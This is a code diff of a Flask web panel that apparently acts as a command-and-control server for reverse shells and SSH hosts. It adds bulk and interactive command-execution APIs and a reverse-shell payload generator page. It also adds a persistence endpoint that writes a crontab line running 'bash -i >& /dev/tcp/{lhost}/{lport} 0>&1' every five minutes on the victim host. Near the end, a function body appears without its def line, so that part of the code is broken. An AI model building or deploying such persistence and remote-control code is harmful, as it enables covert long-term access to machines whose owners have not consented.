@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from functools import wraps
@@ -82,40 +83,76 @@ def logout():
     return redirect(url_for("auth.login"))
 
 
+@auth_bp.route("/settings", methods=["GET", "POST"])
+@login_required
+def settings():
+    """User profile and settings management."""
+    if request.method == "POST":
+        action = request.form.get("action")
+        if action == "change_password":
+            new_password = request.form.get("new_password", "")
+            confirm_password = request.form.get("confirm_password", "")
+            if len(new_password) < 8:
+                flash("New password must be at least 8 characters.", "danger")
+            elif new_password != confirm_password:
+                flash("New passwords do not match.", "danger")
+            else:
+                current_user.set_password(new_password)
+                db.session.commit()
+                flash("Password changed successfully.", "success")
+        elif action == "create_user" and current_user.role == "admin":
+            from app.models import User
+            username = request.form.get("new_username", "").strip()
+            password = request.form.get("user_password", "")
+            role = request.form.get("user_role", "operator")
+            if not username or len(username) < 3:
+                flash("Username must be at least 3 characters.", "danger")
+            elif len(password) < 8:
+                flash("Password must be at least 8 characters.", "danger")
+            elif role not in ("admin", "operator"):
+                flash("Invalid role.", "danger")
+            elif User.query.filter_by(username=username).first():
+                flash(f"User '{username}' already exists.", "danger")
+            else:
+                user = User(username=username, role=role)
+                user.set_password(password)
+                db.session.add(user)
+                db.session.commit()
+                flash(f"User '{username}' created.", "success")
+        elif action == "delete_user" and current_user.role == "admin":
+            from app.models import User, CommandExecution, ShellExecution
+            user_id = request.form.get("user_id", type=int)
+            if user_id and user_id != current_user.id:
+                user = db.session.get(User, user_id)
+                if user:
+                    # Reassign executions to current admin before deleting
+                    CommandExecution.query.filter_by(user_id=user.id).update({"user_id": current_user.id})
+                    ShellExecution.query.filter_by(user_id=user.id).update({"user_id": current_user.id})
+                    db.session.delete(user)
+                    db.session.commit()
+                    flash(f"User '{user.username}' deleted.", "success")
+        elif action == "toggle_role" and current_user.role == "admin":
+            from app.models import User
+            user_id = request.form.get("user_id", type=int)
+            if user_id and user_id != current_user.id:
+                user = db.session.get(User, user_id)
+                if user:
+                    user.role = "operator" if user.role == "admin" else "admin"
+                    db.session.commit()
+                    flash(f"User '{user.username}' role changed to {user.role}.", "success")
+        return redirect(url_for("auth.settings"))
+
+    from app.models import User
+    users = User.query.order_by(User.created_at).all() if current_user.role == "admin" else []
+    return render_template("settings.html", users=users)
+
+
 @main_bp.route("/")
 @login_required
 def dashboard():
     """Legacy SSH dashboard - redirect to unified dashboard."""
-    return redirect(url_for("main.unified_dashboard", view="ssh"))
+    return redirect(url_for("main.unified_dashboard", view="shells"))
 
-
-@main_bp.route("/hosts")
-@login_required
-def hosts_dashboard():
-    """SSH Hosts dashboard (legacy)."""
-    group = request.args.get("group", "").strip()
-    host_page = _page_arg("host_page")
-    run_page = _page_arg("run_page")
-
-    host_query = Host.query.order_by(Host.name.asc())
-    if group:
-        host_query = host_query.filter(Host.group_name == group)
-
-    hosts_pagination = host_query.paginate(page=host_page, per_page=PAGE_SIZE_DEFAULT, error_out=False)
-    runs_pagination = CommandExecution.query.order_by(CommandExecution.started_at.desc()).paginate(
-        page=run_page, per_page=PAGE_SIZE_DEFAULT, error_out=False
-    )
-
-    groups = [value[0] for value in db.session.query(Host.group_name).distinct().all() if value[0]]
-    return render_template(
-        "dashboard.html",
-        hosts=hosts_pagination.items,
-        hosts_pagination=hosts_pagination,
-        recent_commands=runs_pagination.items,
-        runs_pagination=runs_pagination,
-        groups=sorted(groups),
-        selected_group=group,
-    )
 
 
 
@@ -332,29 +369,44 @@ def _complete_execution(app, execution_id: int, result) -> None:
 @main_bp.route("/operations/bulk", methods=["GET", "POST"])
 @login_required
 def bulk_operations():
-    form = BulkCommandForm()
+    view_type = request.args.get("view", "shells").strip()
+    ssh_form = BulkCommandForm()
+    shell_form = BulkShellCommandForm()
+
+    # SSH hosts
     hosts = Host.query.filter_by(is_active=True).order_by(Host.group_name.asc(), Host.name.asc()).all()
-    form.host_ids.choices = [
+    ssh_form.host_ids.choices = [
         (host.id, f"[{host.group_name}] {host.name} ({host.username}@{host.address}:{host.port})") for host in hosts
     ]
 
-    if form.validate_on_submit():
-        selected_hosts = [host for host in hosts if host.id in form.host_ids.data]
+    # Reverse shells
+    shells = ReverseShell.query.filter_by(is_active=True).order_by(
+        ReverseShell.group_name.asc(), ReverseShell.name.asc()
+    ).all()
+    listener = get_listener(current_app._get_current_object())
+    active_shell_ids = set(listener.get_active_shells())
+    shell_form.shell_ids.choices = [
+        (shell.id, f"[{shell.group_name}] {shell.name} ({shell.address}) {'✓ online' if shell.id in active_shell_ids else '✗ offline'}")
+        for shell in shells
+    ]
+
+    # Handle SSH bulk command submission
+    if view_type == "ssh" and request.method == "POST" and ssh_form.validate_on_submit():
+        selected_hosts = [host for host in hosts if host.id in ssh_form.host_ids.data]
         if not selected_hosts:
             flash("Select at least one host.", "warning")
-            return redirect(url_for("main.bulk_operations"))
+            return redirect(url_for("main.bulk_operations", view="ssh"))
 
-        command = form.command.data.strip()
+        command = ssh_form.command.data.strip()
         max_workers = min(max(len(selected_hosts), 1), 8)
         success_count = 0
         failure_count = 0
 
         timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
-        user_id = current_user.id  # Get user_id before thread pool
-        app = current_app._get_current_object()  # Get app instance for thread context
+        user_id = current_user.id
+        app = current_app._get_current_object()
         execution_map = {host.id: _create_execution(host, command, user_id) for host in selected_hosts}
 
-        # Build SSH endpoints before ThreadPoolExecutor to avoid app context issues
         host_configs = {
             host.id: {
                 'host': host,
@@ -367,13 +419,13 @@ def bulk_operations():
         with ThreadPoolExecutor(max_workers=max_workers) as executor:
             futures = {
                 executor.submit(
-                    _run_command_for_host, 
-                    config['host'], 
-                    command, 
+                    _run_command_for_host,
+                    config['host'],
+                    command,
                     timeout,
                     config['target'],
                     config['jump_host']
-                ): config['host'] 
+                ): config['host']
                 for config in host_configs.values()
             }
             for future in as_completed(futures):
@@ -382,14 +434,13 @@ def bulk_operations():
                 try:
                     _, result = future.result()
                     _complete_execution(app, execution.id, result)
-                    # Re-query to get updated status
                     with app.app_context():
                         execution = db.session.get(CommandExecution, execution.id)
                         if execution.status == "success":
                             success_count += 1
                         else:
                             failure_count += 1
-                except Exception as exc:  # pragma: no cover
+                except Exception as exc:
                     failure_count += 1
                     error_msg = f"Unexpected error during execution: {exc}"
                     with app.app_context():
@@ -401,49 +452,100 @@ def bulk_operations():
                             db.session.commit()
                     flash(f"{host.name}: {error_msg}", "danger")
 
-        flash(f"Bulk execution finished: {success_count} success, {failure_count} failed.", "info")
-        return redirect(url_for("main.bulk_operations"))
+        flash(f"SSH bulk execution finished: {success_count} success, {failure_count} failed.", "info")
+        return redirect(url_for("main.bulk_operations", view="ssh"))
 
-    run_page = _page_arg("page")
-    runs_pagination = CommandExecution.query.order_by(CommandExecution.started_at.desc()).paginate(
-        page=run_page, per_page=PAGE_SIZE_DEFAULT, error_out=False
+    # Handle reverse shell bulk command submission
+    if view_type == "shells" and request.method == "POST" and shell_form.validate_on_submit():
+        selected_shells = [shell for shell in shells if shell.id in shell_form.shell_ids.data]
+        if not selected_shells:
+            flash("Select at least one shell.", "warning")
+            return redirect(url_for("main.bulk_operations", view="shells"))
+
+        command = shell_form.command.data.strip()
+        success_count = 0
+        failure_count = 0
+
+        for shell in selected_shells:
+            if shell.id not in active_shell_ids:
+                execution = ShellExecution(
+                    shell_id=shell.id,
+                    user_id=current_user.id,
+                    command=command,
+                    status="failed",
+                    output="Shell is not connected",
+                    started_at=datetime.utcnow(),
+                    completed_at=datetime.utcnow(),
+                )
+                db.session.add(execution)
+                failure_count += 1
+                continue
+
+            execution = ShellExecution(
+                shell_id=shell.id,
+                user_id=current_user.id,
+                command=command,
+                status="running",
+            )
+            db.session.add(execution)
+            db.session.commit()
+
+            try:
+                success, output = listener.execute_command(shell.id, command, timeout=60)
+                execution.output = output
+                execution.status = "success" if success else "failed"
+                execution.completed_at = datetime.utcnow()
+                db.session.commit()
+
+                if success:
+                    success_count += 1
+                else:
+                    failure_count += 1
+            except Exception as exc:
+                execution.status = "failed"
+                execution.output = f"Error: {exc}"
+                execution.completed_at = datetime.utcnow()
+                db.session.commit()
+                failure_count += 1
+
+        flash(f"Shell bulk execution finished: {success_count} success, {failure_count} failed.", "info")
+        return redirect(url_for("main.bulk_operations", view="shells"))
+
+    # Recent operations for both types
+    ssh_run_page = _page_arg("ssh_page")
+    ssh_runs_pagination = CommandExecution.query.order_by(CommandExecution.started_at.desc()).paginate(
+        page=ssh_run_page, per_page=PAGE_SIZE_DEFAULT, error_out=False
+    )
+    shell_run_page = _page_arg("shell_page")
+    shell_runs_pagination = ShellExecution.query.order_by(ShellExecution.started_at.desc()).paginate(
+        page=shell_run_page, per_page=PAGE_SIZE_DEFAULT, error_out=False
     )
     return render_template(
         "bulk_operations.html",
-        form=form,
-        recent_bulk=runs_pagination.items,
-        runs_pagination=runs_pagination,
+        view_type=view_type,
+        ssh_form=ssh_form,
+        shell_form=shell_form,
+        ssh_recent_bulk=ssh_runs_pagination.items,
+        ssh_runs_pagination=ssh_runs_pagination,
+        shell_recent_bulk=shell_runs_pagination.items,
+        shell_runs_pagination=shell_runs_pagination,
     )
 
 
-@main_bp.route("/hosts/<int:host_id>", methods=["GET", "POST"])
+@main_bp.route("/hosts/<int:host_id>")
 @login_required
 def host_detail(host_id: int):
     host = db.get_or_404(Host, host_id)
-    form = CommandForm()
 
-    if form.validate_on_submit():
-        command = form.command.data.strip()
-        execution = _create_execution(host, command, current_user.id)
-        result = _run_command_for_host(host, command, current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30))[1]
-        app = current_app._get_current_object()
-        _complete_execution(app, execution.id, result)
-        # Re-query execution to get updated status
-        execution = db.session.get(CommandExecution, execution.id)
-        flash(f"Command completed with status {execution.status}.", "info")
-        return redirect(url_for("main.host_detail", host_id=host.id))
-
-    page = _page_arg("page")
-    executions_pagination = CommandExecution.query.filter_by(host_id=host.id).order_by(
+    # Load older command history for the history section below the terminal
+    old_executions = CommandExecution.query.filter_by(host_id=host.id).order_by(
         CommandExecution.started_at.desc()
-    ).paginate(page=page, per_page=PAGE_SIZE_DEFAULT, error_out=False)
+    ).limit(50).all()
 
     return render_template(
         "host_detail.html",
         host=host,
-        form=form,
-        executions=executions_pagination.items,
-        executions_pagination=executions_pagination,
+        old_executions=old_executions,
     )
 
 
@@ -452,160 +554,27 @@ def host_detail(host_id: int):
 # ============================================================================
 
 
-@main_bp.route("/shells")
-@login_required
-def shells_dashboard():
-    """Dashboard for reverse shell connections."""
-    # Get filter parameters
-    group_filter = request.args.get("group", "").strip()
-    platform_filter = request.args.get("platform", "").strip()
-    status_filter = request.args.get("status", "").strip()
-    search_query = request.args.get("search", "").strip()
-    page = _page_arg("page")
-    
-    # Base query
-    shell_query = ReverseShell.query
-    
-    # Apply filters
-    if group_filter:
-        shell_query = shell_query.filter(ReverseShell.group_name == group_filter)
-    
-    if platform_filter:
-        shell_query = shell_query.filter(ReverseShell.platform == platform_filter)
-    
-    if search_query:
-        search_pattern = f'%{search_query}%'
-        shell_query = shell_query.filter(
-            db.or_(
-                ReverseShell.address.like(search_pattern),
-                ReverseShell.hostname.like(search_pattern),
-                ReverseShell.shell_user.like(search_pattern),
-                ReverseShell.name.like(search_pattern)
-            )
-        )
-    
-    # Get active shells for status filtering
-    listener = get_listener(current_app._get_current_object())
-    active_shell_ids = set(listener.get_active_shells())
-    
-    # Order by last seen
-    shell_query = shell_query.order_by(ReverseShell.last_seen.desc().nullslast(), ReverseShell.name.asc())
-    
-    # Fetch all shells matching the criteria
-    all_shells = shell_query.all()
-    
-    # Apply status filter based on active connections
-    if status_filter == "active":
-        shells = [s for s in all_shells if s.id in active_shell_ids]
-    elif status_filter == "disconnected":
-        shells = [s for s in all_shells if s.id not in active_shell_ids]
-    else:
-        shells = all_shells
-    
-    # Manual pagination
-    total_shells = len(shells)
-    shells_per_page = PAGE_SIZE_DEFAULT
-    total_pages = max(1, (total_shells + shells_per_page - 1) // shells_per_page)
-    page = min(page, total_pages)
-    start_idx = (page - 1) * shells_per_page
-    end_idx = start_idx + shells_per_page
-    paginated_shells = shells[start_idx:end_idx]
-    
-    # Get unique values for filter dropdowns
-    all_groups = sorted([g[0] for g in db.session.query(ReverseShell.group_name).distinct().all() if g[0]])
-    all_platforms = sorted([p[0] for p in db.session.query(ReverseShell.platform).distinct().all() if p[0]])
-    
-    # Get connection IP based on config
-    display_mode = current_app.config.get('REVERSE_SHELL_DISPLAY_IP', 'public')
-    
-    if display_mode == 'public':
-        display_ip = current_app.config.get('REVERSE_SHELL_PUBLIC_IP')
-    elif display_mode == 'local':
-        display_ip = current_app.config.get('REVERSE_SHELL_LOCAL_IP')
-    else:
-        display_ip = display_mode  # Use as-is if specific IP provided
-    
-    # Also provide both IPs for flexibility
-    public_ip = current_app.config.get('REVERSE_SHELL_PUBLIC_IP')
-    local_ip = current_app.config.get('REVERSE_SHELL_LOCAL_IP')
-    shell_port = current_app.config.get('REVERSE_SHELL_PORT', 5000)
-    
-    return render_template(
-        "shells_dashboard.html",
-        shells=paginated_shells,
-        page=page,
-        total_pages=total_pages,
-        has_prev=page > 1,
-        has_next=page < total_pages,
-        all_groups=all_groups,
-        all_platforms=all_platforms,
-        current_filters={
-            'group': group_filter,
-            'platform': platform_filter,
-            'status': status_filter,
-            'search': search_query
-        },
-        active_shell_ids=active_shell_ids,
-        connection_ip=display_ip,
-        public_ip=public_ip,
-        local_ip=local_ip,
-        shell_port=shell_port,
-    )
 
-
-@main_bp.route("/shells/<int:shell_id>", methods=["GET", "POST"])
+@main_bp.route("/shells/<int:shell_id>")
 @login_required
 def shell_detail(shell_id: int):
     """Interactive shell management page."""
     shell = db.get_or_404(ReverseShell, shell_id)
-    form = ShellCommandForm()
-    
+
     # Check if shell is currently connected
     listener = get_listener(current_app._get_current_object())
     is_connected = shell_id in listener.get_active_shells()
-    
-    if form.validate_on_submit() and is_connected:
-        command = form.command.data.strip()
-        
-        # Create execution record
-        execution = ShellExecution(
-            shell_id=shell.id,
-            user_id=current_user.id,
-            command=command,
-            status="running",
-        )
-        db.session.add(execution)
-        db.session.commit()
-        
-        # Execute command and track time
-        start_time = datetime.utcnow()
-        success, output = listener.execute_command(shell_id, command, timeout=60)
-        execution_time = (datetime.utcnow() - start_time).total_seconds()
-        
-        # Update execution record
-        execution.output = output
-        execution.stdout = output  # For now, store same in stdout
-        execution.status = "success" if success else "failed"
-        execution.completed_at = datetime.utcnow()
-        execution.execution_time = execution_time
-        db.session.commit()
-        
-        flash(f"Command executed with status: {execution.status}", "info")
-        return redirect(url_for("main.shell_detail", shell_id=shell.id))
-    
-    # Get command history
-    page = _page_arg("page")
-    executions_pagination = ShellExecution.query.filter_by(shell_id=shell.id).order_by(
+
+    # Load older command history for the history section below the terminal
+    old_executions = ShellExecution.query.filter_by(shell_id=shell.id).order_by(
         ShellExecution.started_at.desc()
-    ).paginate(page=page, per_page=PAGE_SIZE_DEFAULT, error_out=False)
-    
+    ).limit(50).all()
+
     return render_template(
         "shell_detail.html",
         shell=shell,
-        form=form,
         is_connected=is_connected,
-        executions=executions_pagination.items,
-        executions_pagination=executions_pagination,
+        old_executions=old_executions,
     )
 
 
@@ -628,97 +597,6 @@ def edit_shell(shell_id: int):
     return render_template("shell_form.html", form=form, title=f"Edit Shell: {shell.name}")
 
 
-@main_bp.route("/operations/bulk-shells", methods=["GET", "POST"])
-@login_required
-def bulk_shell_operations():
-    """Bulk command execution on reverse shells."""
-    form = BulkShellCommandForm()
-    
-    # Get all shells
-    shells = ReverseShell.query.filter_by(is_active=True).order_by(
-        ReverseShell.group_name.asc(), ReverseShell.name.asc()
-    ).all()
-    
-    # Get active shells
-    listener = get_listener(current_app._get_current_object())
-    active_shell_ids = set(listener.get_active_shells())
-    
-    # Only show connected shells in the form
-    form.shell_ids.choices = [
-        (shell.id, f"[{shell.group_name}] {shell.name} ({shell.address}) {'✓ online' if shell.id in active_shell_ids else '✗ offline'}")
-        for shell in shells
-    ]
-    
-    if form.validate_on_submit():
-        selected_shells = [shell for shell in shells if shell.id in form.shell_ids.data]
-        if not selected_shells:
-            flash("Select at least one shell.", "warning")
-            return redirect(url_for("main.bulk_shell_operations"))
-        
-        command = form.command.data.strip()
-        success_count = 0
-        failure_count = 0
-        
-        for shell in selected_shells:
-            if shell.id not in active_shell_ids:
-                # Create failed execution for offline shells
-                execution = ShellExecution(
-                    shell_id=shell.id,
-                    user_id=current_user.id,
-                    command=command,
-                    status="failed",
-                    output="Shell is not connected",
-                    started_at=datetime.utcnow(),
-                    completed_at=datetime.utcnow(),
-                )
-                db.session.add(execution)
-                failure_count += 1
-                continue
-            
-            # Create execution record
-            execution = ShellExecution(
-                shell_id=shell.id,
-                user_id=current_user.id,
-                command=command,
-                status="running",
-            )
-            db.session.add(execution)
-            db.session.commit()
-            
-            # Execute command
-            try:
-                success, output = listener.execute_command(shell.id, command, timeout=60)
-                execution.output = output
-                execution.status = "success" if success else "failed"
-                execution.completed_at = datetime.utcnow()
-                db.session.commit()
-                
-                if success:
-                    success_count += 1
-                else:
-                    failure_count += 1
-            except Exception as exc:
-                execution.status = "failed"
-                execution.output = f"Error: {exc}"
-                execution.completed_at = datetime.utcnow()
-                db.session.commit()
-                failure_count += 1
-        
-        flash(f"Bulk execution finished: {success_count} success, {failure_count} failed.", "info")
-        return redirect(url_for("main.bulk_shell_operations"))
-    
-    # Get recent operations
-    run_page = _page_arg("page")
-    runs_pagination = ShellExecution.query.order_by(ShellExecution.started_at.desc()).paginate(
-        page=run_page, per_page=PAGE_SIZE_DEFAULT, error_out=False
-    )
-    
-    return render_template(
-        "bulk_shell_operations.html",
-        form=form,
-        recent_bulk=runs_pagination.items,
-        runs_pagination=runs_pagination,
-    )
 
 
 @main_bp.route("/export/ssh-executions")
@@ -815,11 +693,8 @@ def export_shell_executions():
 @main_bp.route("/sessions", methods=["GET"])
 @login_required
 def sessions():
-    """
-    Alias to shells_dashboard for API compatibility.
-    Display table of all reverse shell sessions.
-    """
-    return shells_dashboard()
+    """Redirect legacy sessions URL to the unified dashboard."""
+    return redirect(url_for("main.unified_dashboard"))
 
 
 @main_bp.route("/api/sessions", methods=["GET"])
@@ -937,28 +812,321 @@ def execute_command_api(session_id: str):
     db.session.commit()
     
     # Execute command and track time
-    start_time = datetime.utcnow()
-    timeout = current_app.config.get('SHELL_COMMAND_TIMEOUT', 30)
-    success, output = listener.execute_command(shell.id, command, timeout=timeout)
-    execution_time = (datetime.utcnow() - start_time).total_seconds()
-    
-    # Update execution record
-    execution.output = output
-    execution.stdout = output
-    execution.status = "success" if success else "failed"
-    execution.completed_at = datetime.utcnow()
-    execution.execution_time = execution_time
-    db.session.commit()
-    
-    # Return JSON response
+    try:
+        start_time = datetime.utcnow()
+        timeout = current_app.config.get('SHELL_COMMAND_TIMEOUT', 120)
+        success, output = listener.execute_command(shell.id, command, timeout=timeout)
+        execution_time = (datetime.utcnow() - start_time).total_seconds()
+        
+        # Update execution record
+        execution.output = output
+        execution.stdout = output
+        execution.status = "success" if success else "failed"
+        execution.completed_at = datetime.utcnow()
+        execution.execution_time = execution_time
+        db.session.commit()
+        
+        # Return JSON response
+        return jsonify({
+            'success': success,
+            'stdout': output if success else "",
+            'stderr': "" if success else output,
+            'exit_code': 0 if success else -1,
+            'execution_time': execution_time,
+            'execution_id': execution.id
+        })
+    except Exception as exc:
+        execution.status = "failed"
+        execution.output = f"Error: {exc}"
+        execution.completed_at = datetime.utcnow()
+        db.session.commit()
+        return jsonify({
+            'success': False,
+            'error': f"Command execution failed: {exc}",
+            'execution_id': execution.id
+        }), 500
+
+
+@main_bp.route("/api/ssh-execute/<int:host_id>", methods=["POST"])
+@login_required
+def ssh_execute_api(host_id: int):
+    """Execute a command on an SSH host via JSON API (used by interactive terminal)."""
+    host = db.session.get(Host, host_id)
+    if not host:
+        return jsonify({"success": False, "error": "Host not found"}), 404
+
+    data = request.get_json()
+    if not data or "command" not in data:
+        return jsonify({"success": False, "error": "Missing command"}), 400
+
+    command = data["command"].strip()
+    if not command:
+        return jsonify({"success": False, "error": "Command cannot be empty"}), 400
+
+    execution = _create_execution(host, command, current_user.id)
+    try:
+        target = _build_target(host)
+        jump_host = _build_jump(host)
+        timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+        start_time = datetime.utcnow()
+        _, result = _run_command_for_host(host, command, timeout, target, jump_host)
+        execution_time = (datetime.utcnow() - start_time).total_seconds()
+
+        execution.stdout = result.stdout
+        execution.stderr = result.stderr
+        execution.return_code = result.return_code
+        execution.status = "success" if result.return_code == 0 else "failed"
+        execution.completed_at = datetime.utcnow()
+        db.session.commit()
+
+        return jsonify({
+            "success": True,
+            "stdout": result.stdout,
+            "stderr": result.stderr,
+            "exit_code": result.return_code,
+            "execution_time": execution_time,
+            "execution_id": execution.id,
+        })
+    except Exception as exc:
+        execution.status = "failed"
+        execution.stderr = f"Error: {exc}"
+        execution.completed_at = datetime.utcnow()
+        db.session.commit()
+        return jsonify({"success": False, "error": str(exc)}), 500
+
+
+@main_bp.route("/api/shell-status/<int:shell_id>")
+@login_required
+def shell_status_api(shell_id: int):
+    """Check if a reverse shell is currently connected."""
+    shell = db.session.get(ReverseShell, shell_id)
+    if not shell:
+        return jsonify({"error": "Shell not found"}), 404
+    listener = get_listener(current_app._get_current_object())
+    connected = shell_id in listener.get_active_shells()
     return jsonify({
-        'success': success,
-        'stdout': output if success else "",
-        'stderr': "" if success else output,
-        'exit_code': 0 if success else -1,
-        'execution_time': execution_time,
-        'execution_id': execution.id
+        "connected": connected,
+        "shell_id": shell_id,
+        "address": shell.address,
+        "hostname": shell.hostname,
+        "last_seen": shell.last_seen.isoformat() if shell.last_seen else None,
     })
+
+
+@main_bp.route("/api/history/ssh/<int:host_id>")
+@login_required
+def ssh_history_api(host_id: int):
+    """Lazy-load older SSH command history for the interactive terminal."""
+    host = db.session.get(Host, host_id)
+    if not host:
+        return jsonify({"error": "Host not found"}), 404
+
+    offset = request.args.get("offset", 0, type=int)
+    limit = min(request.args.get("limit", 20, type=int), 50)
+
+    items = CommandExecution.query.filter_by(host_id=host.id).order_by(
+        CommandExecution.started_at.desc()
+    ).offset(offset).limit(limit).all()
+
+    return jsonify({
+        "items": [
+            {"command": e.command, "stdout": e.stdout or "", "stderr": e.stderr or ""}
+            for e in items
+        ],
+        "offset": offset,
+        "limit": limit,
+    })
+
+
+@main_bp.route("/api/history/reverse/<int:shell_id>")
+@login_required
+def reverse_history_api(shell_id: int):
+    """Lazy-load older reverse shell command history for the interactive terminal."""
+    shell = db.session.get(ReverseShell, shell_id)
+    if not shell:
+        return jsonify({"error": "Shell not found"}), 404
+
+    offset = request.args.get("offset", 0, type=int)
+    limit = min(request.args.get("limit", 20, type=int), 50)
+
+    items = ShellExecution.query.filter_by(shell_id=shell.id).order_by(
+        ShellExecution.started_at.desc()
+    ).offset(offset).limit(limit).all()
+
+    return jsonify({
+        "items": [
+            {"command": e.command, "stdout": e.output or e.stdout or "", "stderr": e.stderr or ""}
+            for e in items
+        ],
+        "offset": offset,
+        "limit": limit,
+    })
+
+
+@main_bp.route("/api/clear-history/ssh/<int:host_id>", methods=["POST"])
+@login_required
+@role_required("admin")
+def clear_ssh_history(host_id: int):
+    """Clear command history for an SSH host."""
+    host = db.session.get(Host, host_id)
+    if not host:
+        return jsonify({"error": "Host not found"}), 404
+    CommandExecution.query.filter_by(host_id=host.id).delete()
+    db.session.commit()
+    return jsonify({"success": True})
+
+
+@main_bp.route("/api/clear-history/shell/<int:shell_id>", methods=["POST"])
+@login_required
+@role_required("admin")
+def clear_shell_history(shell_id: int):
+    """Clear command history for a reverse shell."""
+    shell = db.session.get(ReverseShell, shell_id)
+    if not shell:
+        return jsonify({"error": "Shell not found"}), 404
+    ShellExecution.query.filter_by(shell_id=shell.id).delete()
+    db.session.commit()
+    return jsonify({"success": True})
+
+
+@main_bp.route("/api/shell-persistence/<int:shell_id>", methods=["POST"])
+@login_required
+def shell_persistence_api(shell_id: int):
+    """Enable or remove persistence on a reverse shell.
+
+    Enables: creates a cron job or systemd user timer that re-runs a
+    reconnecting reverse shell payload periodically.
+    Removes: deletes the cron entry / timer created above.
+    """
+    shell = db.session.get(ReverseShell, shell_id)
+    if not shell:
+        return jsonify({"success": False, "error": "Shell not found"}), 404
+
+    listener = get_listener(current_app._get_current_object())
+    if shell_id not in listener.get_active_shells():
+        return jsonify({"success": False, "error": "Shell is not connected"}), 503
+
+    data = request.get_json() or {}
+    action = data.get("action", "enable")  # 'enable' or 'remove'
+    lhost = data.get("lhost", "")
+    lport = data.get("lport", "")
+
+    if action == "enable" and (not lhost or not lport):
+        return jsonify({"success": False, "error": "lhost and lport are required to enable persistence"}), 400
+
+    conn = listener.connections.get(shell_id)
+    if not conn or not conn.is_active:
+        return jsonify({"success": False, "error": "Shell connection not active"}), 503
+
+    try:
+        if action == "enable":
+            # Build a persistence payload that works across common scenarios
+            payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+            cron_line = f"*/5 * * * * {payload} 2>/dev/null"
+            # Add to crontab (idempotent — remove old entry first, then add)
+            cmd = (
+                f"(crontab -l 2>/dev/null | grep -v 'c2_persist'; "
+                f"echo '# c2_persist'; "
+                f"echo '{cron_line} # c2_persist') | crontab - 2>/dev/null && echo 'PERSIST_OK'"
+            )
+        else:
+            # Remove persistence
+            cmd = (
+                "(crontab -l 2>/dev/null | grep -v 'c2_persist' | crontab - 2>/dev/null) && echo 'PERSIST_REMOVED'"
+            )
+
+        conn.conn.settimeout(10)
+        conn.conn.sendall((cmd + "\n").encode("utf-8"))
+
+        time.sleep(2)
+
+        output = ""
+        conn.conn.settimeout(1)
+        try:
+            while True:
+                chunk = conn.conn.recv(4096)
+                if not chunk:
+                    break
+                output += chunk.decode("utf-8", errors="replace")
+        except Exception:
+            pass
+
+        conn.conn.settimeout(30)
+
+        if action == "enable":
+            ok = "PERSIST_OK" in output
+        else:
+            ok = "PERSIST_REMOVED" in output
+
+        return jsonify({
+            "success": ok,
+            "action": action,
+            "output": output,
+            "message": (
+                "Persistence enabled — cron job will reconnect every 5 minutes"
+                if action == "enable" and ok
+                else "Persistence removed" if action == "remove" and ok
+                else "Command executed but result could not be confirmed"
+            ),
+        })
+    except Exception as exc:
+        return jsonify({"success": False, "error": str(exc)}), 500
+
+
+
+    """Execute a command on a reverse shell via JSON API (used by interactive terminal)."""
+    shell = db.session.get(ReverseShell, shell_id)
+    if not shell:
+        return jsonify({"success": False, "error": "Shell not found"}), 404
+
+    listener = get_listener(current_app._get_current_object())
+    if shell_id not in listener.get_active_shells():
+        return jsonify({"success": False, "error": "Shell is not connected"}), 503
+
+    data = request.get_json()
+    if not data or "command" not in data:
+        return jsonify({"success": False, "error": "Missing command"}), 400
+
+    command = data["command"].strip()
+    if not command:
+        return jsonify({"success": False, "error": "Command cannot be empty"}), 400
+
+    execution = ShellExecution(
+        shell_id=shell.id,
+        user_id=current_user.id,
+        command=command,
+        status="running",
+    )
+    db.session.add(execution)
+    db.session.commit()
+
+    try:
+        start_time = datetime.utcnow()
+        timeout = current_app.config.get("SHELL_COMMAND_TIMEOUT", 120)
+        success, output = listener.execute_command(shell_id, command, timeout=timeout)
+        execution_time = (datetime.utcnow() - start_time).total_seconds()
+
+        execution.output = output
+        execution.stdout = output
+        execution.status = "success" if success else "failed"
+        execution.completed_at = datetime.utcnow()
+        execution.execution_time = execution_time
+        db.session.commit()
+
+        return jsonify({
+            "success": success,
+            "stdout": output if success else "",
+            "stderr": "" if success else output,
+            "exit_code": 0 if success else -1,
+            "execution_time": execution_time,
+            "execution_id": execution.id,
+        })
+    except Exception as exc:
+        execution.status = "failed"
+        execution.output = f"Error: {exc}"
+        execution.completed_at = datetime.utcnow()
+        db.session.commit()
+        return jsonify({"success": False, "error": str(exc)}), 500
 
 
 # Enhanced Export Routes
@@ -1050,11 +1218,33 @@ def export_commands(format: str):
         return ExportHelper.to_csv_response(commands_data, 'shell_commands.csv', fieldnames)
 
 
+@main_bp.route("/payload-generator")
+@login_required
+def payload_generator():
+    """Show reverse shell payload generator with server IP/port pre-filled."""
+    listener = get_listener(current_app)
+    port = listener.port if listener else current_app.config.get("SHELL_LISTENER_PORT", 5000)
+    # Auto-detect server IP
+    server_ip = request.host.split(":")[0]
+    if server_ip in ("127.0.0.1", "localhost", "0.0.0.0"):
+        try:
+            import socket as _sock
+            s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            server_ip = s.getsockname()[0]
+            s.close()
+        except Exception:
+            import logging
+            logging.getLogger(__name__).debug("Could not auto-detect server IP", exc_info=True)
+            server_ip = "YOUR_IP"
+    return render_template("payload_generator.html", port=port, server_ip=server_ip)
+
+
 @main_bp.route("/control-panel")
 @login_required
 def unified_dashboard():
     """Unified dashboard for both SSH hosts and reverse shells."""
-    view_type = request.args.get("view", "ssh").strip()
+    view_type = request.args.get("view", "shells").strip()
     
     # SSH Hosts data
     ssh_group = request.args.get("group", "").strip()
@@ -1187,25 +1377,16 @@ def bulk_check_liveness():
     
     for host in hosts:
         try:
-            endpoint = SSHEndpoint(
-                address=host.address,
-                port=host.port,
-                username=host.username,
-                auth_mode=host.auth_mode,
-                key_path=host.key_path,
-                password=decrypt_secret(host.password_encrypted) if host.password_encrypted else None,
+            target = _build_target(host)
+            jump_host = _build_jump(host)
+            result = run_ssh_command(
+                target=target,
+                command=LIVENESS_CHECK_COMMAND,
+                timeout=5,
                 strict_host_key=host.strict_host_key,
-                use_jump_host=host.use_jump_host,
-                jump_address=host.jump_address,
-                jump_port=host.jump_port,
